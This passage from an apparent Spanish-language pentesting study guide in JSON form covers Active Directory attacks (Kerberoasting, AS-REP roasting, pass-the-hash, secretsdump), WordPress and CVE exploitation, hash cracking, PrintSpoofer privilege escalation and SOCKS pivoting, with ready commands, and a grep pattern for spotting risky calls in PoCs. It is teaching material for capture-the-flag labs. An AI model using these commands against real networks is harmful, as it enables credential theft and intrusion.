        "summary": "El sistema de tickets de AD; entender TGT y TGS explica por que existen AS-REP roast y Kerberoasting.",
        "que": "Kerberos es como AD autentica sin mandar la password por la red. Al iniciar sesion, el usuario obtiene un TGT (ticket para pedir tickets) del DC. Luego, para usar un servicio, cambia el TGT por un TGS (ticket de servicio). Todo gira en torno a tickets cifrados con claves derivadas de passwords.",
        "porque": "Porque esos tickets van cifrados con la clave del usuario o del servicio, y se pueden pedir en situaciones que permiten crackearlos offline: eso es lo que explotan [[asrep-kerberoast]]. Ademas, si robas o falsificas tickets, te haces pasar por otro sin su password.",
        "cuando": "Es teoria de apoyo para la fase AD ([[ad-modelo]]). No hace falta dominarla para atacar, pero entender TGT/TGS te dice por que funcionan los ataques de roasting y de tickets.",
        "necesitas": [
            "Puerto 88 (Kerberos) abierto: confirma que estas en un dominio AD.",
        ],
        "no_aplica": [
            "No es un entorno AD (no hay puerto 88): Kerberos no aplica.",
            "Tu reloj y el del DC estan sincronizados y no ves errores de skew: no hace falta tocar nada aqui.",
        ],
        "confirmacion": "Sincroniza tu reloj con el DC si ves KRB_AP_ERR_SKEW en cualquier herramienta de Kerberos.",
        "resultado": "El error de clock skew desaparece y las herramientas de impacket dejan de fallar por tiempo.",
        "senales": [
            "Puerto 88 abierto: hay Kerberos y por tanto un DC.",
            "Errores 'KRB_AP_ERR_SKEW' = tu reloj esta desincronizado con el DC.",
            "Hashes que empiezan por $krb5asrep$ o $krb5tgs$ al hacer roasting.",
        ],
        "pasos": [
            "Asegura nombres y hora: Kerberos es muy sensible al reloj (max ~5 min de desfase).",
            "Con o sin credencial, intenta roasting para sacar tickets crackeables ([[asrep-kerberoast]]).",
            "Crackea los tickets offline para obtener nuevas credenciales.",
            "Con credenciales de mas nivel, sigue el grafo de permisos hacia Domain Admin.",
        ],
        "commands": [
            {
                "cmd": "sudo ntpdate $DC_HOST",
                "why": "Sincroniza tu reloj con el DC. Kerberos rechaza tickets si el desfase supera unos minutos; este es el arreglo del clasico error de clock skew.",
                "out": "Imprime el ajuste de tiempo aplicado. Tras esto, las herramientas de Kerberos (impacket) dejan de fallar por skew. Alternativa: faketime.",
            },
        ],
    },
    {
        "id": "asrep-kerberoast",
        "title": "AS-REP roasting y Kerberoasting",
        "phase": "access",
        "section": "active-directory",
        "summary": "Dos formas de sacar hashes crackeables de Kerberos: sin credenciales (AS-REP) o con una cualquiera (Kerberoast).",
        "que": "Son dos ataques que piden tickets de [[kerberos]] y se quedan con la parte cifrada para crackearla offline. AS-REP roasting funciona contra usuarios con la preautenticacion desactivada y no necesita credenciales. Kerberoasting pide tickets de cuentas de servicio (con SPN) y requiere una credencial de dominio cualquiera.",
        "porque": "El ticket va cifrado con una clave derivada de la password del usuario o de la cuenta de servicio. Si esa password es debil, la crackeas offline sin tocar el DC (sin riesgo de bloqueo). Las cuentas de servicio suelen tener passwords viejas y privilegios altos: premio doble.",
        "cuando": "AS-REP: en cuanto tengas una lista de usuarios ([[smb-enum]]), aunque no tengas password. Kerberoast: en cuanto consigas UNA credencial valida. Ambos encajan en la fase AD ([[ad-modelo]]).",
        "necesitas": [
            "AS-REP: una lista de usuarios (sin credenciales). Kerberoast: una credencial de dominio cualquiera.",
        ],
        "no_aplica": [
            "AS-REP: ningun usuario tiene la preautenticacion desactivada (GetNPUsers no devuelve nada).",
            "Kerberoast: no hay cuentas de servicio con SPN registrado en el dominio.",
        ],
        "confirmacion": "Lanza GetNPUsers -no-pass (AS-REP) o GetUserSPNs -request con una credencial (Kerberoast).",
        "resultado": "Un hash $krb5asrep$ o $krb5tgs$ en la salida. Sin hash, ese vector concreto no aplica en este dominio.",
        "senales": [
            "GetNPUsers devuelve hashes $krb5asrep$ (hay usuarios sin preauth).",
            "GetUserSPNs lista cuentas de servicio con SPN y devuelve $krb5tgs$.",
            "Los nombres de esas cuentas huelen a privilegio (svc_sql, backup, admin).",
        ],
        "pasos": [
            "AS-REP: pasa la lista de usuarios a GetNPUsers con -no-pass.",
            "Kerberoast: con una credencial, pide los tickets de SPN con GetUserSPNs -request.",
            "Crackea los hashes con hashcat (modo 18200 AS-REP, 13100 Kerberoast) y rockyou.",
            "Cada password crackeada -> nueva identidad: vuelve a enumerar el dominio con ella.",
        ],
        "commands": [
            {
                "cmd": "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
                "why": "AS-REP roasting sin credenciales: pide tickets para usuarios con preauth desactivada. Solo necesitas la lista de usuarios y la IP del DC.",
                "out": "Hashes $krb5asrep$ para los usuarios vulnerables. Cada uno es crackeable offline (hashcat -m 18200). Sin salida = nadie tiene preauth desactivada.",
            },
            {
                "cmd": "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request",
                "why": "Kerberoasting: con una credencial de dominio pides los tickets de las cuentas de servicio. Esas cuentas suelen tener passwords debiles y muchos permisos.",
                "out": "Hashes $krb5tgs$ junto al nombre del servicio. Prioriza los que parezcan admin; crackea con hashcat -m 13100.",
            },
        ],
    },
    {
        "id": "ntlm-pth",
        "title": "Hashes NTLM y Pass-the-Hash",
        "phase": "access",
        "section": "active-directory",
        "summary": "En Windows el hash NTLM basta para autenticarte: no siempre hace falta crackear la password.",
        "que": "Windows guarda las passwords como hashes NTLM. Para muchos protocolos de autenticacion, el hash ES la credencial: si lo tienes, puedes autenticarte SIN conocer la password en claro. Eso es Pass-the-Hash (PtH), y convierte un volcado de hashes directamente en acceso.",
        "porque": "El protocolo NTLM usa el hash como secreto compartido, no la password. Por eso volcar hashes (con secretsdump/DCSync tras conseguir privilegios) permite moverte por la red autenticandote con el hash. Solo necesitas crackear si el servicio exige la password en claro o quieres reutilizarla en sitios no-NTLM.",
        "cuando": "Cuando ya has volcado hashes (por admin local, DCSync o del SAM) en la fase AD ([[ad-modelo]]). Es la forma habitual de usar el hash de administrator o de una cuenta de servicio sin perder tiempo crackeando.",
        "necesitas": [
            "Un hash NTLM volcado (secretsdump, DCSync, o SAM local).",
        ],
        "no_aplica": [
            "El servicio exige la password en claro y no acepta autenticacion NTLM (algunos servicios/API la desactivan).",
            "No tienes ningun hash volcado todavia: esto es un paso posterior a secretsdump, no anterior.",
        ],
        "confirmacion": "nxc smb $IP -u administrator -H <NTLM> y revisa si marca (Pwn3d!).",
        "resultado": "(Pwn3d!) en la salida de nxc, o un login exitoso por evil-winrm -H.",
        "senales": [
            "secretsdump te da lineas usuario:rid:lmhash:nthash.",
            "nxc marca (Pwn3d!) al probar el hash: tienes ejecucion.",
            "Tienes el NT hash de administrator o krbtgt.",
        ],
        "pasos": [
            "Vuelca los hashes del objetivo (secretsdump con una cuenta con privilegios).",
            "Prueba el NT hash contra SMB/WinRM con -H en vez de -p.",
            "Si (Pwn3d!), entra con evil-winrm -H para una shell interactiva.",
            "El hash de krbtgt permite Golden Ticket (persistencia total del dominio).",
        ],
        "commands": [
            {
                "cmd": "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
                "why": "Con una cuenta con privilegios (admin local o derechos de replicacion/DCSync) vuelca los hashes NTLM, incluidos administrator y krbtgt.",
                "out": "Lineas usuario:rid:lm:nt. El NT hash de administrator sirve para PtH; el de krbtgt para Golden Ticket. Copia los que apunten a cuentas privilegiadas.",
            },
            {
                "cmd": "evil-winrm -i $IP -u administrator -H <NTLM>",
                "why": "Pass-the-Hash por WinRM: te autenticas con el hash NTLM (-H) sin la password. Si el crackeo falla o tarda, esto te da la shell igual.",
                "out": "Un prompt PS de administrator (whoami lo confirma). Desde ahi recoge la flag y documenta la cadena que te llevo hasta el hash.",
            },
        ],
    },
    {
        "id": "bloodhound",
        "title": "BloodHound: el grafo de permisos",
        "phase": "access",
        "section": "active-directory",
        "summary": "Mapea el dominio como un grafo y te muestra la ruta mas corta de tu usuario a Domain Admin.",
        "que": "BloodHound recolecta usuarios, grupos, equipos, sesiones y ACLs del dominio y los representa como un grafo. En lugar de adivinar que permiso abusar, ves la ruta concreta: quien puede resetear la password de quien, que grupo tiene GenericAll sobre otro, donde hay sesiones de admin que robar.",
        "porque": "En un dominio real las relaciones de permisos son miles y a mano es imposible. El grafo revela caminos no obvios (encadenar tres permisos mediocres para llegar a DA) que definen el ataque en AD ([[ad-modelo]]).",
        "cuando": "En cuanto tengas UNA credencial valida. Es lo que haces cuando el roasting ([[asrep-kerberoast]]) no basto o para planificar el salto final a Domain Admin.",
        "necesitas": [
            "Una credencial de dominio valida (usuario y password, o hash).",
        ],
        "no_aplica": [
            "No tienes ninguna credencial de dominio todavia: BloodHound necesita autenticarse para recolectar.",
            "El dominio es trivialmente pequeno (pocos usuarios/equipos) y ya ves el camino a mano.",
        ],
        "confirmacion": "Corre bloodhound-python con la credencial y confirma que el .zip se genera sin errores de autenticacion.",
        "resultado": "El .zip se importa en la GUI y aparece tu usuario en el grafo; 'Shortest paths to Domain Admins' muestra al menos una ruta.",
        "senales": [
            "Aristas 'GenericAll', 'WriteDACL', 'ForceChangePassword' hacia grupos privilegiados.",
            "Sesiones de un admin en una maquina donde tu tienes acceso.",
            "Un camino corto marcado hacia el grupo Domain Admins.",
        ],
        "pasos": [
            "Recolecta los datos del dominio con un colector (bloodhound-python o SharpHound).",
            "Importa el zip en la GUI y marca tu usuario como 'owned'.",
            "Usa 'Shortest paths to Domain Admins' y estudia cada arista del camino.",
            "Abusa del permiso concreto (cada tipo de arista tiene su tecnica) y avanza un paso.",
        ],
        "commands": [
            {
                "cmd": "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
                "why": "Recolecta todo el grafo del dominio con una sola credencial, sin necesidad de pisar una maquina Windows. -c all junta toda la informacion; --zip lo deja listo para importar.",
                "out": "Un .zip para arrastrar a la GUI de BloodHound. Alli marca tu usuario como owned y lanza la consulta de rutas a Domain Admins.",
            },
        ],
    },
    {
        "id": "recon-metodologia",
        "title": "Metodologia de reconocimiento",
        "phase": "recon",
        "section": "recon-y-servicios",
        "summary": "No puedes atacar lo que no sabes que existe: primero puertos (amplio y rapido), luego versiones, luego enum por servicio.",
        "que": "El reconocimiento es cartografiar la superficie de ataque: que puertos estan abiertos, que servicios corren y en que version. Se hace en capas de lo amplio a lo profundo para no perder tiempo ni hacer ruido: primero todos los puertos sin scripts, despues version y scripts solo en los abiertos, y por ultimo enumeracion especifica de cada servicio.",
        "porque": "Escanear versiones de los 65535 puertos es lentisimo e inutil. Separar 'descubrir puertos' de 'analizar servicios' hace el recon rapido y ordenado. Y cada servicio se enumera distinto, asi que primero necesitas saber cuales hay antes de elegir la tecnica.",
        "cuando": "Es SIEMPRE la primera fase de una room. Cada servicio que descubras deriva a su enumeracion propia (445 -> [[smb-enum]], 80 -> web, 88/389 -> [[ad-modelo]]).",
        "necesitas": [
            "Una IP o rango objetivo alcanzable.",
        ],
        "no_aplica": [
            "Ya tienes la lista completa de puertos/servicios de una fase anterior (no repitas el barrido).",
        ],
        "confirmacion": "Compara el numero de puertos abiertos entre el barrido rapido y el escaneo con -sV: deben coincidir.",
        "resultado": "Una lista de puertos open, y en el segundo escaneo, version y banner de cada servicio.",
        "senales": [
            "Un puerto abierto con una version concreta: tu primera pista para buscar CVEs.",
            "Hostnames en certificados TLS o en scripts de nmap: anadelos a /etc/hosts.",
            "Servicios en puertos no estandar (labs que los mueven a proposito).",
        ],
        "pasos": [
            "Barrido de los 65535 puertos sin scripts, rapido, para saber donde mirar.",
            "Segundo escaneo con -sC -sV SOLO sobre los puertos abiertos, para versiones y datos gratis.",
            "Asocia cada puerto a su enumeracion (web, SMB, DNS, dominio) y profundiza.",
            "Anota versiones y hostnames; alimentan la busqueda de CVEs y el resto del ataque.",
        ],
        "commands": [
            {
                "cmd": "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                "why": "Barrido de amplitud: los 65535 puertos sin scripts es rapido. -Pn evita que nmap descarte el host por no responder al ping (comun en labs).",
                "out": "Solo la lista de puertos open. Copia esos numeros para el segundo escaneo; ignora versiones aqui.",
            },
            {
                "cmd": "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                "why": "Profundidad solo donde hace falta: version exacta (-sV, base de los CVEs) y scripts por defecto (-sC) que sacan datos gratis.",
                "out": "Versiones, banners, hostnames en certificados y hallazgos de scripts (smb anonimo, titulos web). Cada version -> searchsploit.",
            },
        ],
    },
    {
        "id": "wordpress",
        "title": "Atacar WordPress",
        "phase": "enumeration",
        "section": "wordpress",
        "summary": "El core suele estar parcheado; el agujero casi siempre esta en un plugin o tema vulnerable, o en el panel de admin.",
        "que": "WordPress es el CMS mas comun en rooms. Su nucleo se actualiza solito, asi que rara vez es el vector. El fallo vive en los plugins y temas de terceros (miles, muchos sin mantener) o en credenciales debiles del panel /wp-admin, desde donde se llega a ejecucion editando un tema.",
        "porque": "Cada plugin es codigo de terceros con su propia superficie; una version vulnerable de un plugin popular es explotable en masa. Y el panel de admin permite editar los .php del tema: si entras, tienes RCE casi directo. wpscan automatiza detectar version de core, plugins, temas y usuarios.",
        "cuando": "Cuando whatweb o /wp-login.php delatan WordPress. Encaja tras el fingerprint web, antes de intentar bugs genericos.",
        "necesitas": [
            "Confirmacion de que la web es WordPress (wp-content, wp-login.php, meta generator).",
        ],
        "no_aplica": [
            "wpscan no detecta ningun plugin con CVE y el core esta en la ultima version.",
            "No hay usuarios enumerables ni login accesible para spraying.",
        ],
        "confirmacion": "wpscan --url $URL --enumerate vp,u y revisa si algun plugin sale marcado [!] vulnerable.",
        "resultado": "Version del core, lista de plugins con su version, y usuarios enumerados via /?author= o REST API.",
        "senales": [
            "Rutas /wp-content/, /wp-login.php, /wp-json/ o el meta generator con la version.",
            "wpscan lista un plugin con CVE conocido o una version vieja.",
            "Usuarios enumerados via /?author=1 o la API REST -> objetivos de spraying.",
        ],
        "pasos": [
            "Enumera core, plugins, temas y usuarios con wpscan (usa --api-token para ver CVEs).",
            "Cruza cada plugin/version con exploits conocidos; prioriza los pre-auth.",
            "Si no hay CVE, ataca el login (usuarios enumerados + passwords) con cuidado de bloqueos.",
            "Con acceso admin, edita un .php del tema para lograr ejecucion y salta a shell ([[lfi-a-rce]] comparte la idea: escribir codigo que el servidor ejecuta) y luego [[reverse-vs-bind]].",
        ],
        "commands": [
            {
                "cmd": "wpscan --url $URL --enumerate vp,u --plugins-detection aggressive",
                "why": "Enumera plugins vulnerables (vp) y usuarios (u). La deteccion agresiva encuentra plugins que la pasiva no ve. Es el primer paso siempre en WordPress.",
                "out": "Version del core, plugins con su version y [!] de vulnerabilidad, y la lista de usuarios. Cada plugin vulnerable -> busca su exploit; cada usuario -> candidato a login.",
            },
        ],
    },
    {
        "id": "explotar-cve",
        "title": "Explotar un CVE con cabeza",
        "phase": "access",
        "section": "cve-y-exploits",
        "summary": "Un exploit solo sirve si coincide producto Y version; lee el PoC antes de ejecutarlo y confirma con algo inocuo.",
        "que": "Explotar un CVE es aprovechar una vulnerabilidad publica con un PoC (prueba de concepto). El trabajo real no es ejecutar el script, sino confirmar que aplica (producto y version exactos), entender que hace el PoC para no romper la maquina ni comprometer tu equipo, y reproducir el bug de forma minima antes de lanzar el payload completo.",
        "porque": "Un CVE tiene un rango de versiones afectadas; fuera de el, el exploit falla o rompe el servicio. Ademas, los PoC de internet pueden ser destructivos o maliciosos (borran datos, roban tu shell). Por eso se leen antes. Y confirmar con un comando inocuo evita perseguir un falso positivo.",
        "cuando": "Cuando el recon ([[recon-metodologia]]) te da una version concreta y sospechas que es vulnerable. Es una via de acceso inicial alternativa a los bugs web.",
        "necesitas": [
            "Producto y version EXACTOS del servicio (de tu recon).",
        ],
        "no_aplica": [
            "La version esta fuera del rango vulnerable del CVE.",
            "El exploit requiere autenticacion y no tienes ninguna credencial.",
            "El PoC es ilegible/ofuscado y no puedes verificar que hace antes de ejecutarlo.",
        ],
        "confirmacion": "Ejecuta el PoC con un comando inocuo (id, whoami) o su modo --check antes del payload completo.",
        "resultado": "La salida de id/whoami en la respuesta, o un 'vulnerable' explicito del propio exploit.",
        "senales": [
            "searchsploit da una coincidencia exacta de producto y version.",
            "El titulo del exploit indica si es 'Remote'/pre-auth (mejor) o requiere login.",
            "El PoC trae un modo --check no destructivo para validar.",
        ],
        "pasos": [
            "Saca la version exacta y busca exploits para ESE producto y version.",
            "Lee el PoC entero: que variables pide y si hace algo peligroso o conecta fuera.",
            "Cambia IP/puerto a los tuyos y prueba primero con un comando inocuo (id).",
            "Confirmada la ejecucion, cambia el comando por tu reverse shell ([[reverse-vs-bind]]).",
        ],
        "commands": [
            {
                "cmd": "searchsploit PRODUCTO VERSION",
                "why": "Busca exploits para exactamente ese producto y version. Filtrar por version desde el inicio evita perseguir CVEs que no aplican.",
                "out": "Titulos y rutas. Fijate en el rango de version del titulo y en 'Remote'/'Authenticated': eso decide si aplica y si necesitas credencial.",
            },
            {
                "cmd": "grep -nEi 'rm |curl|wget|socket|system|eval' exploit.py",
                "why": "Antes de ejecutar un PoC de internet, caza acciones destructivas o conexiones externas: podria borrar ficheros, descargar algo del autor o robarte la shell.",
                "out": "Lineas con esas llamadas. Un rm -rf o un wget a un dominio ajeno = bandera roja: entiende cada linea o busca otro PoC.",
            },
        ],
    },
    {
        "id": "cracking",
        "title": "Identificar y crackear hashes",
        "phase": "access",
        "section": "hashes-y-cracking",
        "summary": "Antes de crackear, identifica el tipo de hash; empieza por rockyou; y reutiliza cada password en todos los servicios.",
        "que": "Cuando encuentras un hash (en una BD, un fichero, un volcado), crackearlo es recuperar la password en claro probando candidatos offline. La clave esta en tres cosas: identificar el tipo de hash para usar el modo correcto, elegir un buen diccionario, y despues reutilizar la password (el reuse es la norma, no la excepcion).",
        "porque": "Cada tipo de hash usa un algoritmo distinto; hashcat necesita el modo (-m) exacto o no encuentra nada aunque la password este en rockyou. Y los ficheros protegidos (zip, KeePass, claves SSH) no se crackean directos: se convierten a hash con los *2john. La mayoria de rooms usan passwords de rockyou, asi que empezar por ahi ahorra horas.",
        "cuando": "Tras hacer loot y encontrar hashes o ficheros protegidos. Los hashes de Kerberos vienen de [[asrep-kerberoast]]; los NTLM se pueden usar sin crackear via [[ntlm-pth]].",
        "no_aplica": [
            "El hash usa un salt unico por usuario y no tienes ninguna pista de la password (fuerza bruta pura, poco realista en CTF).",
            "El servicio de origen ya te dio la password en claro: no hace falta crackear nada.",
        ],
        "confirmacion": "Identifica el tipo con hashid y lanza hashcat/john con rockyou en modo diccionario.",
        "resultado": "La linea hash:password al caer. Si rockyou no la saca en minutos, revisa si el hash realmente era el vector.",
        "necesitas": [
            "El hash (o el fichero protegido: .kdbx, id_rsa con passphrase, zip).",
            "Saber el TIPO de hash para elegir el modo de hashcat (hashid / name-that-hash).",
            "Un diccionario (rockyou.txt) y, para ficheros protegidos, el *2john correspondiente.",
        ],
        "senales": [
            "Un hash cuya longitud/formato hashid asocia a un tipo (NTLM, bcrypt, sha512crypt).",
            "Un fichero .kdbx, id_rsa con passphrase o zip protegido: conviertelo con *2john.",
            "Una password que cae con rockyou en segundos (tipico de CTF).",
        ],
        "pasos": [
            "Identifica el tipo de hash (hashid / name-that-hash) para elegir el modo.",
            "Si es un fichero protegido, conviertelo a hash con el *2john correspondiente.",
            "Crackea con hashcat/john y rockyou; aplica reglas antes de rendirte.",
            "Password en claro -> pruebala en TODOS los servicios (SMB, SSH, WinRM, paneles): el reuse desbloquea rooms.",
        ],
        "commands": [
            {
                "cmd": "hashid 'HASH'",
                "why": "Usar el modo equivocado de hashcat no rompe nada, pero pierdes horas sin resultado. Identificar el tipo primero es obligatorio.",
                "out": "Posibles tipos (MD5, NTLM, bcrypt...). Cruzalo con el contexto (hash de Windows = NTLM) para elegir el -m correcto.",
            },
            {
                "cmd": "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
                "why": "hashcat usa GPU (rapido) y rockyou cubre la mayoria de retos. -m 1000 es NTLM; cambia el numero segun lo que dijo hashid.",
                "out": "La linea hash:password al caer (o con --show). Si no cae en minutos, quiza el vector real no era crackear ese hash.",
            },
        ],
    },
    {
        "id": "winprivesc-modelo",
        "title": "Escalada de privilegios en Windows",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Mismo principio que en Linux, pero los vectores son privilegios de token, servicios mal configurados y credenciales guardadas.",
        "que": "Escalar en Windows es pasar de un usuario normal a SYSTEM/Administrator. La logica es la misma que el [[privesc-modelo]] de Linux (abusar de algo privilegiado que puedes tocar), pero cambian los vectores: privilegios de token (SeImpersonate), servicios con permisos o rutas debiles, tareas programadas, y credenciales guardadas en el sistema.",
        "porque": "Windows delega mucho poder via privilegios y servicios. Un servicio que corre como SYSTEM pero cuyo binario o ruta puedes modificar te da SYSTEM. Y ciertos privilegios de token permiten suplantar cuentas mas potentes ([[token-impersonation]]). WinPEAS automatiza la deteccion, pero hay que saber que mira.",
        "cuando": "Con una shell de usuario en Windows. Enumera de forma sistematica ([[enum-privesc-windows]]) empezando por whoami /priv y whoami /groups; a menudo el privilegio de token ya te da el vector sin buscar mas.",
        "necesitas": [
            "Una shell de usuario en Windows.",
        ],
        "no_aplica": [
            "Ya eres nt authority\\system: no hay nada que escalar.",
            "No tienes ejecucion de comandos todavia (esto es post-shell).",
        ],
        "confirmacion": "whoami /priv y whoami /groups como primer barrido.",
        "resultado": "Un privilegio de token habilitado (SeImpersonate, SeBackup) o un servicio/credencial explotable.",
        "senales": [
            "whoami /priv muestra SeImpersonatePrivilege o SeAssignPrimaryToken (habitual en cuentas de servicio/IIS).",
            "Un servicio con unquoted service path o con binario/carpeta escribible por ti.",
            "Credenciales en el registro, en ficheros unattend.xml, o AlwaysInstallElevated activado.",
        ],
        "pasos": [
            "Orientate: whoami /priv y whoami /groups. Los privilegios de token son el atajo mas comun.",
            "Si tienes SeImpersonate/SeAssignPrimaryToken -> [[token-impersonation]] (familia Potato) a SYSTEM.",
            "Si no, revisa servicios (rutas sin comillas, permisos), tareas y credenciales guardadas (WinPEAS lo lista).",
            "Explota el vector, confirma con whoami que eres nt authority\\system y recoge la flag.",
        ],
        "commands": [
            {
                "cmd": "whoami /priv",
                "why": "Lista tus privilegios de token. Es lo primero y mas rentable: varios privilegios (SeImpersonate, SeBackup, SeRestore) llevan a SYSTEM casi directo.",
                "out": "Privilegios y si estan Enabled. SeImpersonatePrivilege -> familia Potato ([[token-impersonation]]). SeBackup/SeRestore -> lectura de ficheros protegidos (SAM/SYSTEM).",
            },
            {
                "cmd": "whoami /groups",
                "why": "Muestra tus grupos y el nivel de integridad. Pertenecer a Administrators (aunque sin elevar) o un nivel alto cambia que vectores aplican.",
                "out": "Grupos y flags. 'BUILTIN\\Administrators' presente -> bypass de UAC para elevar. Nivel de integridad Medium vs High orienta el siguiente paso.",
            },
        ],
    },
    {
        "id": "token-impersonation",
        "title": "Impersonation de token (familia Potato)",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "El privilegio SeImpersonate deja suplantar el token de SYSTEM: es la escalada mas comun en cuentas de servicio Windows.",
        "que": "SeImpersonatePrivilege permite a un proceso actuar con el token de seguridad de otro cliente que se conecte a el. Los exploits de la familia Potato (JuicyPotato, PrintSpoofer, GodPotato) enganan a un servicio privilegiado para que se autentique contra ellos y asi capturan y suplantan el token de SYSTEM, obteniendo una shell SYSTEM.",
        "porque": "Las cuentas de servicio (IIS, MSSQL) suelen tener SeImpersonate por diseno para funcionar, pero ese mismo privilegio permite robar el token de SYSTEM. Es tan comun que ver SeImpersonate en whoami /priv casi garantiza la escalada. Es un caso concreto del [[winprivesc-modelo]].",
        "cuando": "En cuanto whoami /priv muestre SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege como Enabled, tipico tras comprometer una web (IIS) o un servicio en Windows.",
        "no_aplica": [
            "whoami /priv no muestra SeImpersonate ni SeAssignPrimaryToken como Enabled.",
            "El spooler/servicio objetivo esta parcheado contra todas las variantes de Potato conocidas.",
        ],
        "confirmacion": "Ejecuta PrintSpoofer -i -c whoami y comprueba el usuario devuelto.",
        "resultado": "'nt authority\\system' en la salida de whoami dentro del proceso lanzado.",
        "necesitas": [
            "Una shell en Windows (a menudo como cuenta de servicio: IIS, MSSQL).",
            "SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege habilitado (whoami /priv).",
            "El binario adecuado a la version: PrintSpoofer o GodPotato (subelo a la maquina).",
        ],
        "senales": [
            "SeImpersonatePrivilege = Enabled en whoami /priv.",
            "Tu usuario es un service account (iis apppool\\..., mssql, local service).",
            "PrintSpoofer o GodPotato devuelven un token de SYSTEM al ejecutarlos.",
        ],
        "pasos": [
            "Confirma SeImpersonate con whoami /priv.",
            "Sube el binario adecuado (PrintSpoofer/GodPotato segun la version de Windows).",
            "Ejecutalo pidiendo que lance un comando como SYSTEM (whoami, o tu shell).",
            "Confirma nt authority\\system; con hashes del SAM puedes ademas moverte via [[ntlm-pth]].",
        ],
        "commands": [
            {
                "cmd": "PrintSpoofer64.exe -i -c cmd",
                "why": "Abusa de SeImpersonate forzando al spooler a autenticarse contra el exploit y suplantando su token SYSTEM. -i abre una consola interactiva como SYSTEM.",
                "out": "Un cmd nuevo donde whoami dice 'nt authority\\system'. Si falla por version/parcheo del spooler, prueba GodPotato o JuicyPotato segun el Windows.",
            },
        ],
    },
    {
        "id": "pivoting-tunel",
        "title": "Pivoting: tuneles a la red interna",
        "phase": "pivot",
        "section": "pivoting",
        "summary": "La maquina comprometida ve una red que tu Kali no alcanza; la usas de puente montando un tunel.",
        "que": "Pivotar es usar una maquina ya comprometida como puente para llegar a hosts internos que tu atacante no alcanza directamente. Se monta un tunel (SOCKS) a traves del pivot y se enruta el trafico de tus herramientas por el, con lo que puedes escanear y atacar la red interna como si estuvieras dentro.",
        "porque": "Las redes se segmentan: el pivot tiene una segunda interfaz o rutas a rangos que tu no ves. Un tunel reverse (chisel, ligolo-ng) hace que el pivot conecte hacia ti, esquivando firewalls que bloquean entrada. Por un SOCKS solo pasa TCP, de ahi que en nmap uses -sT y no SYN scan.",
        "cuando": "Cuando ya tienes acceso a una maquina y descubres una red interna nueva (ip a, ip route, arp -a muestran rangos que tu Kali no tiene). Cada host interno alcanzado reinicia el ciclo recon/enum/acceso.",
        "necesitas": [
            "Acceso ya establecido a la maquina pivot (shell o SSH).",
            "Confirmacion de que existe una red interna nueva (ip a / ip route / arp -a).",
        ],
        "no_aplica": [
            "ip route/arp -a no muestran ninguna red distinta a la que ya atacas: no hay nada que pivotar.",
            "No tienes forma de ejecutar binarios en el pivot (solo lectura) y tampoco tienes SSH con -D disponible.",
        ],
        "confirmacion": "Levanta el tunel y prueba un curl/nc contra un puerto conocido de la red interna antes de escanear.",
        "resultado": "El puerto SOCKS local escuchando (ss -tlnp) y respuesta del host interno a traves del proxy.",
        "senales": [
            "El pivot tiene una IP en un rango distinto al que tu atacas (ej. 10.10.20.x).",
            "ip route o arp -a revelan hosts internos que no salian en tu escaneo inicial.",
            "Servicios internos que solo responden a traves del proxy.",
        ],
        "pasos": [
            "Confirma la red interna desde el pivot (ip a, ip route, arp -a).",
            "Monta el tunel: ssh -D si tienes SSH, o chisel/ligolo en reverse si solo ejecutas binarios.",
            "Enruta tus herramientas por el SOCKS con proxychains (nmap con -sT).",
            "Valida con un objetivo pequeno y repite el ciclo de ataque contra los hosts internos.",
        ],
        "commands": [
            {
                "cmd": "ssh -D 1080 -N user@$IP",
                "why": "Si tienes SSH al pivot, -D monta un proxy SOCKS local sin instalar nada. Es la via mas rapida y limpia con credenciales SSH validas.",
                "out": "No imprime nada (-N): el exito es el puerto 1080 escuchando en tu Kali (compruebalo con ss -tlnp). A partir de ahi, todo va con proxychains.",
            },
            {
                "cmd": "proxychains nmap -sT -Pn -n -p80,445 10.10.20.5",
                "why": "proxychains rutea nmap por el SOCKS hacia la red interna. -sT (connect) es obligatorio: por un SOCKS no pasa el SYN scan y darias todo por cerrado.",
                "out": "Puertos abiertos del host interno. Ve a pocos puertos (es lento por el tunel). Servicios abiertos = una mini-room nueva dentro de la red.",
            },
        ],
    },
    {
        "id": "enum-privesc-linux",
        "title": "Enumeracion para privesc en Linux",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Antes de explotar hay que enumerar en orden fijo; un script automatiza, pero saber que mira cada check es lo que te hace resolver.",
        "que": "Enumerar para privesc es recorrer de forma sistematica todos los vectores posibles en un orden que va de lo mas rentable a lo mas laborioso. Herramientas como linpeas lo automatizan y colorean los hallazgos, pero entender que representa cada resultado es lo que convierte 'output' en 'vector'. Es el paso previo obligado del [[privesc-modelo]].",
        "porque": "Adivinar pierde tiempo. Un recorrido fijo (sudo, SUID, capabilities, cron, servicios, credenciales, kernel) garantiza que no te saltas nada. linpeas resalta en rojo/amarillo lo probable, pero da falsos positivos: hay que validar cada pista contra el modelo mental.",
        "cuando": "Justo tras conseguir shell y estabilizarla ([[tty-stabilization]]). Corre primero los checks rapidos manuales (sudo -l, id) y luego lanza linpeas para lo exhaustivo.",
        "necesitas": [
            "Una shell de usuario ya estabilizada.",
        ],
        "no_aplica": [
            "Ya recorriste todos los vectores manualmente y linpeas no aporta nada nuevo.",
        ],
        "confirmacion": "Corre sudo -l e id primero (gratis); despues linpeas para el resto.",
        "resultado": "Al menos un hallazgo resaltado en rojo/amarillo en linpeas, o una entrada NOPASSWD en sudo -l.",
        "senales": [
            "linpeas marca en rojo/amarillo (99% PE vectors) un binario, servicio o fichero.",
            "pspy muestra procesos o cron que arrancan como root de forma periodica.",
            "Un hallazgo que encaja con el modelo: algo root que puedes leer/escribir/influir.",
        ],
        "pasos": [
            "Checks rapidos manuales: id, sudo -l, SUID ([[suid]]), capabilities ([[capabilities]]).",
            "Lanza linpeas y lee de arriba a abajo, priorizando lo resaltado.",
